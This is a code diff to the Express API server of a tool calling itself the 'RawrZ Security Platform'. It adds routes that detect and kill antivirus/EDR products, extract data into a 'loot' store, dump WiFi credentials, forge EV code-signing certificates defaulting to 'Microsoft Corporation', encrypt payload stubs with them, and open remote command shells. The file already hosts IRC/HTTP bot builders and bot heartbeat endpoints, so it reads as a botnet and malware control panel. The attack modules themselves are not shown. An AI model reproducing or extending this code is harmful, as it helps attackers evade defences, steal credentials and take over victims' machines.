@@ -6,7 +6,8 @@ const networkTools=require('./src/engines/network-tools');const healthMonitor=re
 const digitalForensics=require('./src/engines/digital-forensics');const JottiScanner=require('./src/engines/jotti-scanner');
 const malwareAnalysis=require('./src/engines/malware-analysis');const PrivateVirusScanner=require('./src/engines/private-virus-scanner');
 const CamelliaAssemblyEngine=require('./src/engines/camellia-assembly');const dualGenerators=require('./src/engines/dual-generators');
-const reverseEngineering=require('./src/engines/reverse-engineering');
+const reverseEngineering=require('./src/engines/reverse-engineering');const nativeCompiler=require('./src/engines/native-compiler');
+const redKiller=require('./src/engines/red-killer');const EVCertEncryptor=require('./src/engines/ev-cert-encryptor');const redShells=require('./src/engines/red-shells');const evCertEncryptor=new EVCertEncryptor();
 const app=express();const port=parseInt(process.env.PORT||'8080',10);const authToken=process.env.AUTH_TOKEN||'';const rawrz=new RawrZStandalone();const advancedStubGenerator=new AdvancedStubGenerator();
 function requireAuth(req,res,next){if(!authToken)return next();const h=(req.headers['authorization']||'');const q=req.query.token;if(h.startsWith('Bearer ')){const p=h.slice(7).trim();if(p===authToken)return next()}if(q&&q===authToken)return next();return res.status(401).json({error:'Unauthorized'})}
 app.use(helmet({
@@ -40,9 +41,13 @@ app.use(helmet({
 (async()=>{try{const camelliaAssembly=new CamelliaAssemblyEngine();await camelliaAssembly.initialize({});console.log('[OK] Camellia Assembly initialized')}catch(e){console.error('[WARN] Camellia Assembly init failed:',e.message)}})();
 (async()=>{try{await dualGenerators.initialize({});console.log('[OK] Dual Generators initialized')}catch(e){console.error('[WARN] Dual Generators init failed:',e.message)}})();
 (async()=>{try{await reverseEngineering.initialize({});console.log('[OK] Reverse Engineering initialized')}catch(e){console.error('[WARN] Reverse Engineering init failed:',e.message)}})();
+(async()=>{try{await nativeCompiler.initialize({});console.log('[OK] Native Compiler initialized')}catch(e){console.error('[WARN] Native Compiler init failed:',e.message)}})();
+(async()=>{try{await redKiller.initialize();console.log('[OK] Red Killer initialized')}catch(e){console.error('[WARN] Red Killer init failed:',e.message)}})();
+(async()=>{try{await evCertEncryptor.initialize();console.log('[OK] EV Certificate Encryptor initialized')}catch(e){console.error('[WARN] EV Certificate Encryptor init failed:',e.message)}})();
+(async()=>{try{await redShells.initialize();console.log('[OK] Red Shells initialized')}catch(e){console.error('[WARN] Red Shells init failed:',e.message)}})();
 app.get('/health',(_req,res)=>res.json({ok:true,status:'healthy'}));
 app.get('/api/status',requireAuth,async(_req,res)=>{try{const status={platform:'RawrZ Security Platform',version:'2.1.0',uptime:Date.now()-rawrz.startTime,engines:{total:Object.keys(rawrz.availableEngines||{}).length,loaded:rawrz.loadedEngines?.size||0,available:Object.keys(rawrz.availableEngines||{})},features:{total:150,active:Object.keys(rawrz.availableEngines||{}).length},system:{nodeVersion:process.version,platform:process.platform,arch:process.arch,memory:process.memoryUsage(),cpu:process.cpuUsage()},timestamp:new Date().toISOString()};res.json({success:true,result:status})}catch(e){console.error('[ERROR] Status endpoint failed:',e);res.status(500).json({success:false,error:e.message,stack:e.stack})}});
-app.post('/api/rebuild',requireAuth,async(_req,res)=>{try{console.log('[INFO] Rebuilding platform state...');await rawrz.rebuildPlatformState();const result={status:'rebuilt',engines:rawrz.loadedEngines?.size||0,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){console.error('[ERROR] Rebuild endpoint failed:',e);res.status(500).json({success:false,error:e.message,stack:e.stack})}});
+app.post('/api/rebuild',requireAuth,async(_req,res)=>{try{console.log('[INFO] Rebuilding platform state...');await rawrz.rebuildPlatformState();const result={status:'rebuilt',engines:rawrz.loadedEngines?.size||0,timestamp:new Date().toISOString()};if(!res.headersSent){res.json({success:true,result});}}catch(e){console.error('[ERROR] Rebuild endpoint failed:',e);if(!res.headersSent){res.status(500).json({success:false,error:e.message,stack:e.stack});}}});
 app.get('/panel',(_req,res)=>res.sendFile(path.join(__dirname,'public','panel.html')));
 app.get('/irc-bot-builder',(_req,res)=>res.sendFile(path.join(__dirname,'public','irc-bot-builder.html')));
 app.get('/http-bot-panel',(_req,res)=>res.sendFile(path.join(__dirname,'public','http-bot-panel.html')));
@@ -52,8 +57,8 @@ app.get('/bot-manager',(_req,res)=>res.sendFile(path.join(__dirname,'public','bo
 app.get('/unified',(_req,res)=>res.sendFile(path.join(__dirname,'public','unified-panel.html')));
 
 // Unified Panel API endpoints
-app.get('/api/dashboard/stats',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const stats={totalBots:0,activeBots:0,ircBots:0,httpBots:0,connectedChannels:0,securityScore:100};if(botGenerator&&botGenerator.getBotStats){const ircStats=botGenerator.getBotStats();stats.ircBots=ircStats.total||0;stats.totalBots+=stats.ircBots;}if(httpBotGenerator&&httpBotGenerator.getBotStats){const httpStats=httpBotGenerator.getBotStats();stats.httpBots=httpStats.total||0;stats.totalBots+=stats.httpBots;}stats.activeBots=stats.totalBots;res.json({success:true,result:stats})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/api/bots/status',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const bots=[];if(botGenerator&&botGenerator.getActiveBots){const ircBots=botGenerator.getActiveBots();bots.push(...ircBots.map(bot=>({...bot,type:'IRC'})));}if(httpBotGenerator&&httpBotGenerator.getActiveBots){const httpBots=httpBotGenerator.getActiveBots();bots.push(...httpBots.map(bot=>({...bot,type:'HTTP'})));}res.json({success:true,result:{bots,total:bots.length,active:bots.filter(b=>b.status==='online').length}})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/api/dashboard/stats',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const stats={totalBots:0,activeBots:0,ircBots:0,httpBots:0,connectedChannels:0,securityScore:100};if(botGenerator&&typeof botGenerator.getBotStats==='function'){try{const ircStats=botGenerator.getBotStats();stats.ircBots=ircStats.total||0;stats.totalBots+=stats.ircBots;}catch(e){console.log('[WARN] IRC bot stats error:',e.message);}}if(httpBotGenerator&&typeof httpBotGenerator.getBotStats==='function'){try{const httpStats=httpBotGenerator.getBotStats();stats.httpBots=httpStats.total||0;stats.totalBots+=stats.httpBots;}catch(e){console.log('[WARN] HTTP bot stats error:',e.message);}}stats.activeBots=stats.totalBots;res.json({success:true,result:stats})}catch(e){console.error('[ERROR] Dashboard stats endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
+app.get('/api/bots/status',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const bots=[];if(botGenerator&&typeof botGenerator.getActiveBots==='function'){try{const ircBots=botGenerator.getActiveBots();bots.push(...ircBots.map(bot=>({...bot,type:'IRC'})));}catch(e){console.log('[WARN] IRC bot status error:',e.message);}}if(httpBotGenerator&&typeof httpBotGenerator.getActiveBots==='function'){try{const httpBots=httpBotGenerator.getActiveBots();bots.push(...httpBots.map(bot=>({...bot,type:'HTTP'})));}catch(e){console.log('[WARN] HTTP bot status error:',e.message);}}res.json({success:true,result:{bots,total:bots.length,active:bots.filter(b=>b.status==='online').length}})}catch(e){console.error('[ERROR] Bots status endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
 app.get('/api/irc/channels',requireAuth,async(_req,res)=>{try{const channels=[{name:'#rawrz',users:15,topic:'RawrZ Security Discussion',status:'joined'},{name:'#test',users:3,topic:'Testing Channel',status:'joined'}];res.json({success:true,result:channels})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/api/irc/connect',requireAuth,async(req,res)=>{try{const{server,port,nick,channels}=req.body||{};if(!server||!port||!nick)return res.status(400).json({error:'server, port, and nick are required'});const result={connected:true,server,port,nick,channels:channels||[],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/api/irc/disconnect',requireAuth,async(_req,res)=>{try{const result={connected:false,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
@@ -132,6 +137,11 @@ app.post('/stub-generator/analyze',requireAuth,async(req,res)=>{try{const{stubDa
 app.get('/stub-generator/comprehensive-stats',requireAuth,async(_req,res)=>{try{const result=await advancedStubGenerator.getComprehensiveStats();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.get('/stub-generator/export-stats/:format',requireAuth,async(req,res)=>{try{const{format}=req.params||{};const result=await advancedStubGenerator.exportStatistics(format);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/stub-generator/reset-stats',requireAuth,async(_req,res)=>{try{const result=await advancedStubGenerator.resetStatistics();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/native-compiler/compile',requireAuth,async(req,res)=>{try{const{sourceCode,language,options={}}=req.body||{};if(!sourceCode||!language)return res.status(400).json({error:'sourceCode and language are required'});const result=await nativeCompiler.compileSource(sourceCode,language,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/native-compiler/regenerate',requireAuth,async(req,res)=>{try{const{exePath,options={}}=req.body||{};if(!exePath)return res.status(400).json({error:'exePath is required'});const result=await nativeCompiler.regenerateExecutable(exePath,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/native-compiler/stats',requireAuth,async(_req,res)=>{try{const result=nativeCompiler.getCompilationStats();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/native-compiler/supported-languages',requireAuth,async(_req,res)=>{try{const result=Object.keys(nativeCompiler.supportedLanguages);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/native-compiler/available-compilers',requireAuth,async(_req,res)=>{try{const result=Object.keys(nativeCompiler.compilerPaths);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 
 // Bot Management endpoints
 app.get('/bot/heartbeat',requireAuth,async(req,res)=>{try{const{bot_id,status,timestamp}=req.query||{};console.log(`[BOT] Heartbeat from ${bot_id}: ${status}`);res.json({success:true,message:'Heartbeat received'})}catch(e){res.status(500).json({error:e.message})}});
@@ -332,4 +342,51 @@ app.get('/health-monitor/status',requireAuth,async(req,res)=>{try{const{monitorI
 app.post('/health-monitor/toggle',requireAuth,async(req,res)=>{try{const{monitorId,enabled}=req.body||{};if(!monitorId||typeof enabled!=='boolean')return res.status(400).json({error:'monitorId and enabled are required'});const result=healthMonitor.toggleMonitor(monitorId,enabled);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/health-monitor/interval',requireAuth,async(req,res)=>{try{const{monitorId,interval}=req.body||{};if(!monitorId||!interval)return res.status(400).json({error:'monitorId and interval are required'});const result=healthMonitor.updateMonitorInterval(monitorId,interval);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 
-app.listen(port,()=>console.log('[OK] RawrZ API listening on port',port));
+// Red Killer endpoints
+app.get('/red-killer/status',requireAuth,async(req,res)=>{try{const status=await redKiller.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/red-killer/detect',requireAuth,async(req,res)=>{try{const detected=await redKiller.detectAVEDR();res.json({success:true,detected})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/red-killer/execute',requireAuth,async(req,res)=>{try{const{systems}=req.body||{};if(!systems)return res.status(400).json({error:'systems is required'});const result=await redKiller.executeRedKiller(systems);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/red-killer/extract',requireAuth,async(req,res)=>{try{const{targets}=req.body||{};const result=await redKiller.extractData(targets);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/red-killer/loot',requireAuth,async(req,res)=>{try{const loot=await redKiller.getLootContainer();res.json({success:true,loot})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/red-killer/loot/:id',requireAuth,async(req,res)=>{try{const{id}=req.params;const item=await redKiller.inspectLootItem(id);res.json({success:true,item})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/red-killer/wifi-dump',requireAuth,async(req,res)=>{try{const wifi=await redKiller.dumpWiFiCredentials();res.json({success:true,wifi})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/red-killer/kills',requireAuth,async(req,res)=>{try{const kills=await redKiller.getActiveKills();res.json({success:true,kills})}catch(e){res.status(500).json({error:e.message})}});
+
+// EV Certificate Encryptor endpoints
+app.get('/ev-cert/status',requireAuth,async(req,res)=>{try{const status=await evCertEncryptor.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/ev-cert/generate',requireAuth,async(req,res)=>{try{const{template='Microsoft Corporation',options={}}=req.body||{};const certId=await evCertEncryptor.generateEVCertificate(template,options);res.json({success:true,certId})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/ev-cert/certificates',requireAuth,async(req,res)=>{try{const certificates=await evCertEncryptor.getCertificates();res.json({success:true,certificates})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/ev-cert/encrypt-stub',requireAuth,async(req,res)=>{try{const{stubCode,language,certId,options={}}=req.body||{};if(!stubCode||!language||!certId)return res.status(400).json({error:'stubCode, language, and certId are required'});const result=await evCertEncryptor.encryptStubWithEVCert(stubCode,language,certId,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/ev-cert/stubs',requireAuth,async(req,res)=>{try{const stubs=await evCertEncryptor.getEncryptedStubs();res.json({success:true,stubs})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/ev-cert/templates',requireAuth,async(req,res)=>{try{const templates=await evCertEncryptor.getSupportedTemplates();res.json({success:true,templates})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/ev-cert/languages',requireAuth,async(req,res)=>{try{const languages=await evCertEncryptor.getSupportedLanguages();res.json({success:true,languages})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/ev-cert/algorithms',requireAuth,async(req,res)=>{try{const algorithms=await evCertEncryptor.getSupportedAlgorithms();res.json({success:true,algorithms})}catch(e){res.status(500).json({error:e.message})}});
+
+// Red Shells endpoints
+app.get('/red-shells/status',requireAuth,async(req,res)=>{try{const status=await redShells.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/red-shells/create',requireAuth,async(req,res)=>{try{const{shellType='powershell',options={}}=req.body||{};const shell=await redShells.createRedShell(shellType,options);res.json({success:true,shell})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/red-shells/:id/execute',requireAuth,async(req,res)=>{try{const{id}=req.params;const{command}=req.body||{};if(!command)return res.status(400).json({error:'command is required'});const result=await redShells.executeCommand(id,command);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/red-shells',requireAuth,async(req,res)=>{try{const shells=await redShells.getActiveShells();res.json({success:true,shells})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/red-shells/:id/history',requireAuth,async(req,res)=>{try{const{id}=req.params;const history=await redShells.getShellHistory(id);res.json({success:true,history})}catch(e){res.status(500).json({error:e.message})}});
+app.delete('/red-shells/:id',requireAuth,async(req,res)=>{try{const{id}=req.params;const result=await redShells.terminateShell(id);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/red-shells/stats',requireAuth,async(req,res)=>{try{const stats=await redShells.getShellStats();res.json({success:true,stats})}catch(e){res.status(500).json({error:e.message})}});
+
+// Advanced Features Panel
+app.get('/advanced-features', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'advanced-features-panel.html'));
+});
+
+// Export the app and server for external use
+module.exports = {
+  app,
+  port,
+  authToken,
+  rawrz,
+  advancedStubGenerator,
+  evCertEncryptor
+};
+
+// Start the server if this file is run directly
+if (require.main === module) {
+  app.listen(port,()=>console.log('[OK] RawrZ API listening on port',port));
+}
